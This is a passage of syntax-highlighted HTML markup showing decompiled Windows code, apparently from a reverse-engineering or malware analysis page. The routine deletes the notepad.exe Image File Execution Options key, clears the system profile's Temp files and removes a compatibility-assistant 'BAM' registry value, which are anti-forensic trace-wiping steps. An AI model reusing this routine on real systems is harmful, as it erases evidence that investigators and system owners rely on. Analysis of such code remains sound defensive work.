lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003038\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Executio n Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000300 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003052\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteTreeW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000300 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003065\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002f8 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003097\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Execution  Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002f8 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400030b1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteTreeA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002f8 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400030c4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400030d3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400030f3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002d0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Temp\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">* \"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003102\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003111\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002d0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003119\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002c8 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000314b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppCompatFlags\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Comp atibility Assistant\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Store\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002c8 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003165\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteValueA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"BAM\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000002c8 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan 